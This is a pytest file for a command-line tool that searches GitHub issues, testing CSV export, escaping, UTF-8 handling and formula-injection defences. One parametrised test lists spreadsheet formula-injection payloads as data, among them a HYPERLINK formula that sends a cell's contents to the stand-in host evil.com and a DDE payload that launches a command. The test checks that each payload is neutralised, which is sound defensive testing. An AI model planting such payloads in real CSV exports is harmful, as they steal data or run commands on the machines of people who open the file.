"""Tests for gfi CLI output formats."""

import csv
import io

import pytest
from click.testing import CliRunner

from gfi.cli import CSV_COLUMNS, cli
from gfi.search import Issue


@pytest.fixture
def issues():
    return [
        Issue(
            number=1,
            title='Parser handles commas, "quotes", and\nnewlines',
            repo="owner/project",
            url="https://github.com/owner/project/issues/1",
            state="open",
            labels=["good first issue", "désign"],
            created_at="2026-09-01T12:30:00Z",
            stars=42,
            comments=3,
        ),
        Issue(
            number=2,
            title="UTF-8: café ☕",
            repo="owner/project",
            url="https://github.com/owner/project/issues/2",
            state="open",
        ),
    ]


@pytest.fixture
def fake_searcher(monkeypatch, issues):
    class FakeSearcher:
        def __init__(self):
            self.marked = []

        def search(self, **kwargs):
            return iter(issues)

        def is_seen(self, issue):
            return False

        def _seen_key(self, issue):
            return issue.url or f"{issue.repo}#{issue.number}"

        def sort_deterministicly(self, issues):
            return sorted(
                issues,
                key=lambda i: (i.stars, i.created_at or ""),
                reverse=True,
            )

        # Mirrors GitHubSearcher.mark_seen, which `feed` calls in every output
        # format. Without it this double raised AttributeError as soon as
        # `feed --csv` reached the marking loop -- the very line the early
        # return used to skip, which is how that bug stayed invisible here.
        def mark_seen(self, issue):
            self.marked.append(issue)

        _seen = {}

    monkeypatch.setattr("gfi.cli.GitHubSearcher", FakeSearcher)


def parse_csv(output):
    return [row for row in csv.reader(io.StringIO(output)) if row]


def test_search_csv_has_exact_header_and_escaped_rows(fake_searcher):
    result = CliRunner().invoke(cli, ["search", "--csv"])

    assert result.exit_code == 0
    rows = parse_csv(result.output)
    assert rows[0] == list(CSV_COLUMNS)
    assert rows[1] == [
        "1",
        'Parser handles commas, "quotes", and\nnewlines',
        "owner/project",
        "https://github.com/owner/project/issues/1",
        "good first issue, désign",
        "2026-09-01T12:30:00Z",
        "3",
        "42",
    ]
    assert rows[2] == [
        "2",
        "UTF-8: café ☕",
        "owner/project",
        "https://github.com/owner/project/issues/2",
        "",
        "",
        "0",
        "0",
    ]


@pytest.mark.parametrize(
    ("args", "expected_rows"),
    [
        (["repo", "owner/project", "--csv"], 3),
        (["trending", "--limit", "2", "--csv"], 3),
        (["feed", "--csv"], 3),
    ],
)
def test_other_commands_support_csv(fake_searcher, args, expected_rows):
    result = CliRunner().invoke(cli, args)

    assert result.exit_code == 0
    rows = parse_csv(result.output)
    assert rows[0] == list(CSV_COLUMNS)
    assert len(rows) == expected_rows


@pytest.mark.parametrize(
    "payload",
    [
        '=HYPERLINK("http://evil.com/steal?d="&A1,"Click")',
        "+1+2",
        "-5+cmd|' /C calc'!A0",
        "@SUM(A1:A10)",
        "\t=1+2",
        "\r=1+2",
    ],
)
def test_csv_formula_injection_neutralised(monkeypatch, payload):
    iss = Issue(
        number=99,
        title=payload,
        repo="owner/project",
        url="https://github.com/owner/project/issues/99",
        state="open",
        labels=["good first issue"],
        created_at="2026-09-01T00:00:00Z",
        stars=10,
        comments=2,
    )

    class FakeSearcher:
        def search(self, **kwargs):
            return iter([iss])

        def is_seen(self, issue):
            return False

        def _seen_key(self, issue):
            return issue.url

        def sort_deterministicly(self, issues):
            return issues

        _seen = {}

    monkeypatch.setattr("gfi.cli.GitHubSearcher", FakeSearcher)

    result = CliRunner().invoke(cli, ["search", "--csv"])
    assert result.exit_code == 0
    rows = parse_csv(result.output)
    assert rows[0] == list(CSV_COLUMNS)
    assert rows[1][1] == "'" + payload


def test_csv_safe_preserves_numeric_and_safe_strings():
    from gfi.cli import _csv_safe

    assert _csv_safe(42) == 42
    assert _csv_safe(-10) == -10
    assert _csv_safe(0) == 0
    assert _csv_safe("Normal title") == "Normal title"
    assert _csv_safe("owner/repo") == "owner/repo"
    assert _csv_safe("=cmd") == "'=cmd"
    assert _csv_safe("+cmd") == "'+cmd"
    assert _csv_safe("-cmd") == "'-cmd"
    assert _csv_safe("@cmd") == "'@cmd"
    assert _csv_safe("\t=1+2") == "'\t=1+2"
    assert _csv_safe("\r=1+2") == "'\r=1+2"
    assert _csv_safe("") == ""


def test_search_subprocess_calls_use_utf8_encoding(monkeypatch):
    """All gh subprocess calls must pass encoding='utf-8'.

    Regression test for #106: on Windows, the default cp1252 codec
    raised UnicodeDecodeError on UTF-8 output from gh, which caused
    subprocess.run to return stdout=None and crash downstream.
    """
    calls = []

    class FakeResult:
        returncode = 0
        stdout = "[]"
        stderr = ""

    def fake_run(*args, **kwargs):
        calls.append(kwargs)
        return FakeResult()

    monkeypatch.setattr("subprocess.run", fake_run)

    result = CliRunner().invoke(cli, ["search", "--limit", "1"])

    assert result.exit_code == 0
    assert calls, "subprocess.run was not called during search"
    for call_kwargs in calls:
        assert call_kwargs.get("encoding") == "utf-8", (
            f"subprocess.run called without encoding='utf-8': {call_kwargs}"
        )
